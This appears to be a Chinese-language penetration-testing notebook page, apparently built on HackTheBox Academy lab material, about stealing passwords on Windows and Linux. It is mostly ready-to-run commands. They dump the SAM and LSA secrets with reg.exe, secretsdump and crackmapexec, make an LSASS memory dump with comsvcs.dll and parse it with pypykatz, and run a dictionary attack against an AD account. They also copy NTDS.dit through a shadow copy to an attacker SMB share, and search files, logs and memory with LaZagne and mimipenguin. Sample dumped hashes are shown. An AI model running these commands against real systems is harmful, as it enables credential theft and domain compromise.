---
cover: ../.gitbook/assets/背景6.jpg
coverY: 0
---

# 密码攻击

## 一、应用服务

### 1. 网络应用程序

1. [WINRM](../服务/winrm.md)
2. [RDP](../服务/rdp.md)
3. [SSH](../服务/ssh.md)
4. [SMB](../服务/smb.md)

## 二、Windows  本地密码攻击

### 1. 攻击 SAM

> 渗透进入 WIndows  主机后，我们可能会尝试<mark style="color:orange;">**`快速转存与 SAM 数据库关联`**</mark>的文件，并使用 [文件传输 ](wen-jian-chuan-shu.md)相关的利用传输到我们的攻击主机开始离线破解哈希

|     注册表名称     | 描述                                          |
| :-----------: | ------------------------------------------- |
|    hklm\sam   | 包含与**本地密码**关联的哈希值                           |
|  hklm\system  | 包含系统引导密钥，用于`加密 SAM 数据库`。我们需要引导密钥来解密 SAM 数据库 |
| hklm\security | 包含`域帐户的缓存凭据`                                |

#### 1. 使用 reg.exe 保存并赋值注册表配置单元

> 以`管理员`的方式启动 CMD 才可以进行下述操作

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

#### 2. 使用 Impacket 的 secretsdump.py 转储哈希

> 我们可以使用 secretsdump.py  进行转储哈希，当我们获得了哈希之后，就可以使用相关的破解攻击对哈希值进行破解

{% code title="" lineNumbers="true" %}
```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

    Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
    
    [*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  # 这一行表明了格式
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
    defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
    bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
    sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
    rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
    ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
    [*] Dumping cached domain logon information (domain/username:hash)
    [*] Dumping LSA Secrets
    [*] DPAPI_SYSTEM 
    dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
    dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
    [*] NL$KM 
     0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
     0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
     0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
     0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
    NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
    [*] Cleaning up...
```
{% endcode %}

#### 3. 远程转储和 LSA 机密注意事项

<pre class="language-shell"><code class="lang-shell"><strong># 远程转储 LSA 机密
</strong><strong>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
</strong><strong>
</strong><strong># 远程获取 SAM 数据库
</strong>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre>

### 2. 攻击 LSASS

> 与攻击 SAM 相同，攻击 LSASS 首先需要通过生成内存转储创建 LSASS 进行内存内容的副本

#### 1. Rundll32.exe & Comsvc​​s.dll 方法

> 在生成转储后，使用[文件传输](wen-jian-chuan-shu.md)的相关方法进行转存哈希

```shell
 # 获取 LSASS 的 PID
 Get-Process lsass
 # 使用 Powershell 创建 lsass.dmp
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

#### 2. 使用 [Pypykatz](https://github.com/skelsec/pypykatz) 提取凭据

> Pypykatz 是完全用 Python 编写的 Mimikatz 的实现

```bash
# 运行 pypykatz
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

> 输出内容信息含义：
>
> 1. MSV ： Windows 中的一个身份验证包，LSA 调用它来验证针对 SAM 数据库的登录尝试。Pypykatz 提取了与存储在 LSASS 进程内存中的 bob 用户帐户登录会话相关联的SID、Username、Domain甚至NT&密码哈希
> 2. WDIGEST ： 是在`Windows XP`-`Windows 8`和`Windows Server 2003`-中默认启用的较旧的身份验证协议`Windows Server 2012`。LSASS 以明文形式缓存 WDIGEST 使用的凭据
> 3. Kerberos ： 是 Windows 域环境中 Active Directory 使用的网络身份验证协议
> 4.  DPAPI ： 数据保护应用程序编程接口或[DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)是 Windows 操作系统中的一组 API，用于在每个用户的基础上为 Windows 操作系统功能和各种第三方应用程序加密和解密 DPAPI 数据 blob。以下是一些使用 DPAPI 的应用程序示例及其用途\
>
>
>     | 应用                        | DPAPI的使用                    |
>     | ------------------------- | --------------------------- |
>     | Internet Explorer         | 密码表单自动完成数据（已保存站点的用户名和密码）。   |
>     | Google Chrome             | 密码表单自动完成数据（已保存站点的用户名和密码）。   |
>     | Outlook                   | 电子邮件帐户的密码。                  |
>     | Remote Desktop Connection | 保存连接到远程机器的凭据。               |
>     | Credential Manager        | 保存用于访问共享资源、加入无线网络、VPN 等的凭据。 |

### 3. 攻击 AD 和 NTDS.dit

1. 使用 CracjMapExec 与 AD 账户进行字典攻击

```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

1. 捕获 NTDS.dit

```bash
# 使用捕获的凭据连接到目标 DC
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
# 确认用户具有的权限后再进行利用
# 创建 C: 的卷影副本
vssadmin CREATE SHADOW /For=C:
# 从 VSS 复制 NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
# 将 NTDS.dit 传输到攻击主机
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

# 或者使用 crackmapexec 捕获 neds
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### 4. Windows 中凭据搜索

1. 使用 [LaZagne ](https://github.com/AlessandroZ/LaZagne)等第三方工具快速发现 Web 浏览器或其他已安装应用程序可能不安全存储的凭据

```bash
# 将会执行Lazagne 并运行all包含的模块
start lazagne.exe all
```

&#x20; 2\. 使用查找字符串

```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## 三、LINUX 密码攻击

### 1. Linux 中凭据搜索

| 文件           | History              | 内存                   | 凭据                         |
| ------------ | -------------------- | -------------------- | -------------------------- |
| Configs      | Logs                 | Cache                | Browser stored credentials |
| Databases    | Command-line History | In-memory Processing |                            |
| Notes        |                      |                      |                            |
| Scripts      |                      |                      |                            |
| Source codes |                      |                      |                            |
| Cronjobs     |                      |                      |                            |
| SSH Keys     |                      |                      |                            |

#### 1. 文件

```bash
# 配置文件
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# 配置文件中的凭据
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# 数据库
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# 笔记
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# 脚本
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# 定时任务
cat /etc/crontab
ls -la /etc/cron.*/

# SSH 密钥
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

#### 2. 历史

| 日志文件                | 描述                           |
| ------------------- | ---------------------------- |
| /var/log/messages   | 通用系统活动日志。                    |
| /var/log/syslog     | 通用系统活动日志。                    |
| /var/log/auth.log   | (Debian) 所有与身份验证相关的日志。       |
| /var/log/secure     | (RedHat/CentOS) 所有身份验证相关的日志。 |
| /var/log/boot.log   | 引导信息。                        |
| /var/log/dmesg      | 硬件和驱动程序相关信息和日志。              |
| /var/log/kern.log   | 内核相关的警告、错误和日志。               |
| /var/log/faillog    | 登录尝试失败。                      |
| /var/log/cron       | 与 cron 作业相关的信息。              |
| /var/log/mail.log   | 所有与邮件服务器相关的日志。               |
| /var/log/httpd      | 所有与 Apache 相关的日志。            |
| /var/log/mysqld.log | 所有 MySQL 服务器相关的日志。           |

```bash
# 历史
 tail -n5 /home/*/.bash*

# 日志
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

#### 3. 内存和缓存

> 许多应用程序和进程使用身份验证所需的凭据并将它们存储在内存或文件中，以便可以重复使用,我们可以使用 [mimipenguin ](https://github.com/huntergregal/mimipenguin)，这需要管理员权限，适用于 Linux, 又或者我们可以使用 LaZagne

```bash
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
```

### 2. Passwd, Shadow & Opasswd

#### 1. Passwd

> 这个文件包含每个先用用户的信息，并且可以被所有用户和服务读取

1. 密码格式

| cry0l1t3 | : | x    | : | 1000  | : | 1000 | : | cry0l1t3,,, | : | /home/cry0l1t3 | : | /bin/bash             |
| -------- | - | ---- | - | ----- | - | ---- | - | ----------- | - | -------------- | - | --------------------- |
| 登录名      |   | 密码信息 |   | 唯一标识符 |   | GUID |   | 全名          |   | 主目录            |   | shell                 |

#### 2. Shadow

> 由于读取密码哈希值会使整个系统处于危险之中，/etc/shadow因此开发了该文件，其格式与密码类似，/etc/passwd但仅负责密码及其管理。它包含创建用户的所有密码信息。例如，如果/etc/shadow文件中没有用户在 中的条目，则/etc/passwd该用户被视为无效。该/etc/shadow文件也只能由具有管理员权限的用户读取

1. 格式



| cry0l1t3 | : | $6$wBRzy$...SNIP...x9cDWUxW1 | : | 18937  | : | 0  | : | 99999 | : | 7   | :   | :    | : |
| -------- | - | ---------------------------- | - | ------ | - | -- | - | ----- | - | --- | --- | ---- | - |
| 用户名      |   | 加密密码                         |   | 上次更改时间 |   | 分组 |   | 最大限度  |   | 警告期 | 闲置期 | 截止日期 |   |



## 四、Windows 横向移动



